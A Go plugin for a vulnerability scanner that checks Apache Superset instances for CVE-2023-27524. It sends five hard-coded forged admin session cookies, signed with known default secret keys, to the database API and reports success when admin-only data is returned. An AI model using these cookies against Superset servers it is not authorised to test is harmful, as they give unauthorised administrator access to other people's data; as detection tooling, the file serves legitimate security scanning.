package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
	"sync"
)

func init() {
	Register("superset_bypass_cve_2023_27524", &superset_bypass_cve_2023_27524{})
}

type superset_bypass_cve_2023_27524 struct{}

func (p *superset_bypass_cve_2023_27524) Info() PluginInfo {
	return PluginInfo{
		Name:     "Apache Superset 默认SECRET_KEY漏洞（CVE-2023-27524）",
		VulnInfo: "Apache Superset 是一款现代化的开源大数据工具，用于数据探索分析和数据可视化。未经授权的攻击者可根据默认配置的SECRET_KEY伪造成管理员用户访问Apache Superset。",
		VulnID:   "CVE-2023-27524",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "Apache Superset <= 2.0.1",
		CWE:      "CWE-1188	不安全的默认资源初始化",
	}
}

func (p *superset_bypass_cve_2023_27524) Check(netloc string) bool {
	sessionValues := []string{
		"eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKFnng.XPeCvkBiP7rOv1PhgKZ8xkzi2jk",
		"eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKFu3g.k_WNoBY1ouhQyOXa5UcYdjVVuq0",
		"eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_fg.KalpJbMq1SZPCBuunG9-ycDX9HM",
		"eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_zQ.FPiBfT39gn2slf--XZHsk0rByEY",
		"eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKHAPQ.zRjwotMHJES3eW8fJH8F_5GlD-U",
	}

	type result struct {
		success bool
	}

	var wg sync.WaitGroup
	results := make(chan result, len(sessionValues))

	for _, session := range sessionValues {
		wg.Add(1)
		localSession := session
		go func() {
			defer wg.Done()

			req, err := http.NewRequest("GET", netloc+"/api/v1/database/1", nil)
			if err != nil {
				results <- result{false}
				return
			}

			localSession = "session=\"" + localSession + "\""
			req.Header.Set("Cookie", localSession)

			resp, err := utils.RequestDo(req, true, 2)
			if err != nil {
				results <- result{false}
				return
			}

			if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "database_name") &&
				strings.Contains(resp.ResponseRaw, "configuration_method") {
				results <- result{true}
			} else {
				results <- result{false}
			}
		}()
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	for r := range results {
		if r.success {
			return true
		}
	}

	return false
}
